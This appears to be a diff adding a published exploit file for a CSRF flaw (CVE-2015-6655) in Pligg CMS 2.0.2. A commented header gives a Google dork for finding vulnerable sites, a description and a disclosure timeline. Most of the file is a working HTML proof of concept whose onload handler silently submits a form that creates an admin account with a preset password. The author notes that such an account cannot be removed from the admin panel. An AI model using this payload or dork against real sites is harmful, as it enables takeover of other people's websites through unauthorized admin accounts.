@@ -1,0 +1,57 @@
+<!--
+# Exploit Title: Pligg CMS CSRF Add Admin Exploit
+# Google Dork: intext:"Made wtih Pligg CMS"
+# Date: 2015/8/20
+# Exploit Author: Arash Khazaei
+# Vendor Homepage: http://pligg.com
+# Software Link:
+https://github.com/Pligg/pligg-cms/releases/download/2.0.2/2.0.2.zip
+# Version: 2.0.2
+# Tested on: Kali , Iceweasel Browser
+# CVE : CVE-2015-6655
+# Contact : http://twitter.com/0xClay
+# Mail : 0xclay@gmail.com
+# Site : http://bhunter.ir
+
+# Description :
+
+# Pligg CMS Is A CMS Written In PHP Language And Licensed Under GPL V 2.0
+# In Pligg CMS Panel In Adding Users Section Pligg CMS Allow To Attacker
+Add Admin By CSRF
+# Vulnerability In Add Users Sections . Another Thing Is Added Admin By
+CSRF Vulnerability
+# Can't Deleted By Admin :) And Admin Should Delete It From Database .
+
+# Exploit :
+-->
+<body onload="document.exploit.submit();">
+<form action="http://localhost/pligg-cms-master/admin/admin_users.php"
+method="post" id="createUserForm" name="exploit" onsubmit="return
+checkValidation()">
+<input name="username" type="text" class="form-control" id="username"
+value="hacker"  onchange="checkUsername(this.value)" />
+<input name="email" type="text" class="form-control" id="email" value="
+hacker@hacker.com" onchange="checkEmail(this.value)"/>
+<select name="level">
+<option value="admin">Admin</option>
+</select>
+<input name="password" type="text" class="form-control" id="password"
+value="hacker123" onchange="checkPassword(this.value)"/>
+<input type="hidden" name="mode" value="newuser">
+<input type="submit" class="btn btn-primary" value="Create User"/>
+
+</form>
+<!--
+
+Timeline :
+21/5/2015 Reported To Developer Team .
+22/5/2015 No Responde From Developer Team.
+22/5/2015 Request CVE
+23/5/2015 Published Vulnerability
+
+
+# Note: Change The Values Of Exploit To Another Thing :)
+
+# Discovered By Arash Khazaei . (Aka JunkyBoy (Nick Name Changed :P ))
+
+-->
